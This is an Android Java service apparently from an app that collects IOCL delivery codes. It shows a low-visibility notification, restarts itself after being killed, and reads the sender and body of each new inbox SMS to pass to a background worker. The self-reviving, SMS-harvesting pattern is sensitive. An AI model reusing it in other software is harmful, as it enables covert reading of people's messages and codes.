package android.iocl.dac_collector.Services;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.database.Cursor;
import android.iocl.dac_collector.R;
import android.iocl.dac_collector.Receivers.MyReceiver;
import android.iocl.dac_collector.SyncAdapters.SyncUtils;
import android.iocl.dac_collector.Ui.MainActivity;
import android.iocl.dac_collector.Utility.NotificationHelper;
import android.iocl.dac_collector.Utility.SmsWorkUtil;
import android.iocl.dac_collector.Utility.Utility;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.work.Data;
import androidx.work.ExistingWorkPolicy;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;
import androidx.work.WorkRequest;

public class FixOppoAutoKill extends Service {
    private static final String CHANNEL_ID = "fix_oppo_channel";
    private static final String CHANNEL_NAME = "Block this | FixOppoAutoKill";
    private static final String TAG = "FixOppoAutoKill";
    private static final int NOTIFICATION_ID = 1;

    private MyReceiver myReceiver;
    private boolean isReceiverRegistered = false;
    private SmsObserver smsObserver;

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            createNotificationChannel();
            Notification notification = createNotification();
            Log.d(TAG, "Calling startForeground with notification");
            startForeground(NOTIFICATION_ID, notification);

            new Thread(() -> {
                try {
                    SyncUtils.initialize(getApplicationContext());
                    JobSchedulerUtil.fetch_profile_info(getApplicationContext());
                } catch (Exception e) {
                    Log.e(TAG, "Error initializing sync/jobs", e);
                }
            }).start();

        } catch (Exception e) {
            Log.e(TAG, "Error during service creation", e);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            if (!isReceiverRegistered) {
                myReceiver = new MyReceiver();
                IntentFilter filter = new IntentFilter(Intent.ACTION_USER_PRESENT);
                registerReceiver(myReceiver, filter);
                isReceiverRegistered = true;





                if (smsObserver == null) {
                    smsObserver = new SmsObserver(new Handler(Looper.getMainLooper()));
                    getContentResolver().registerContentObserver(
                            Uri.parse("content://sms"), true, smsObserver
                    );
                }

            } else {
                Log.d(TAG, "Receiver already registered, skipping");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to register receiver", e);
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        try {
            scheduleServiceRestart();
        } catch (Exception e) {
            Log.e(TAG, "Failed to schedule service restart", e);
        }

        try {
            if (isReceiverRegistered && myReceiver != null) {
                unregisterReceiver(myReceiver);
                isReceiverRegistered = false;
                Log.d(TAG, "Receiver unregistered");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to unregister receiver", e);
        }

        if (smsObserver != null) {
            getContentResolver().unregisterContentObserver(smsObserver);
            smsObserver = null;
        }

    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void scheduleServiceRestart() {
        try {
            Intent intent = new Intent(this, MyReceiver.class);
            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                    this, 0, intent, PendingIntent.FLAG_IMMUTABLE);

            AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            if (alarmManager != null) {
                long triggerAt = System.currentTimeMillis() + 10000; // 10 seconds
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    alarmManager.setExactAndAllowWhileIdle(
                            AlarmManager.RTC_WAKEUP, triggerAt, pendingIntent);
                } else {
                    alarmManager.set(
                            AlarmManager.RTC_WAKEUP, triggerAt, pendingIntent);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Alarm scheduling failed", e);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                NotificationChannel channel = new NotificationChannel(
                        CHANNEL_ID,
                        CHANNEL_NAME,
                        NotificationManager.IMPORTANCE_MIN
                );
                channel.setDescription("Keeps the background service alive");
                channel.enableLights(false);
                channel.enableVibration(false);
                channel.setSound(null, null);

                NotificationManager manager = getSystemService(NotificationManager.class);
                if (manager != null) {
                    manager.createNotificationChannel(channel);
                }
            } catch (Exception e) {
                Log.e(TAG, "Notification channel creation failed", e);
            }
        }
    }

    private Notification createNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this, 0, intent, PendingIntent.FLAG_IMMUTABLE);

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Service Running")
                .setContentText("Keeping app alive")
                .setSmallIcon(R.drawable.gas_cylinder_icon) // must exist
                .setContentIntent(pendingIntent)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setSilent(true)
                .build();
    }



    private class SmsObserver extends ContentObserver {
        // Solution 1: Handler-based Debounce
        private final Handler debounceHandler;
        private final Runnable debounceRunnable;
        private static final long DEBOUNCE_DELAY = 2000; // 2 seconds

        public SmsObserver(Handler handler) {
            super(handler);
            // Initialize debounce handler and runnable
            debounceHandler = new Handler(Looper.getMainLooper());
            debounceRunnable = new Runnable() {
                @Override
                public void run() {
                    try {
                        readNewSms();
                    } catch (Exception e) {
                        Log.e("SmsObserver", "Error in debounced SMS read", e);
                    }
                }
            };
        }

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);

            // Debounce logic: Remove any pending callbacks and post a new one
            debounceHandler.removeCallbacks(debounceRunnable);
            debounceHandler.postDelayed(debounceRunnable, DEBOUNCE_DELAY);
        }

        @Override
        public void onChange(boolean selfChange, Uri uri) {
            super.onChange(selfChange, uri);

            // Debounce logic for URI-based onChange
            debounceHandler.removeCallbacks(debounceRunnable);
            debounceHandler.postDelayed(debounceRunnable, DEBOUNCE_DELAY);
        }

        private void readNewSms() {
            Cursor cursor = null;
            try {
                cursor = getContentResolver().query(
                        Uri.parse("content://sms/inbox"),
                        new String[]{"address", "body", "date"},
                        null,
                        null,
                        "date DESC LIMIT 1"
                );
                if (cursor != null && cursor.moveToFirst()) {
                    int addressIndex = cursor.getColumnIndex("address");
                    int bodyIndex = cursor.getColumnIndex("body");

                    if (addressIndex >= 0 && bodyIndex >= 0) {
                        String sender = cursor.getString(addressIndex);
                        String message = cursor.getString(bodyIndex);


                        showSmsToast(sender, message);
                    } else {
                        Log.e("SMSReader", "Missing column indexes");
                    }
                }
            } catch (Exception e) {
                Log.e("SmsObserver", "Failed to read SMS", e);
            } finally {
                if (cursor != null) {
                    try {
                        cursor.close();
                    } catch (Exception ignored) {}
                }
            }
        }

        private void showSmsToast(String sender, String message) {

            Log.d(TAG, "showSmsToast: CALIINGGG ");


            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        boolean isPosted = NotificationHelper.isNotificationActive(
                                getApplicationContext(), Utility.NOTIFICATION_ID);

                        if (!isPosted) {
                            String dateMillis = Utility.getStandardDatenTime(); // stable timestamp from SMS
                            SmsWorkUtil.enqueueSmsWorker(getApplicationContext(), sender, message, dateMillis);

                        } else {
                            Log.d(TAG, "Notification already posted, ignoring");
                        }
                    }
                } catch (Exception e) {
                    Log.e("SmsObserver", "Error posting SMS toast", e);
                }
            }, 2000);
        }
    }
}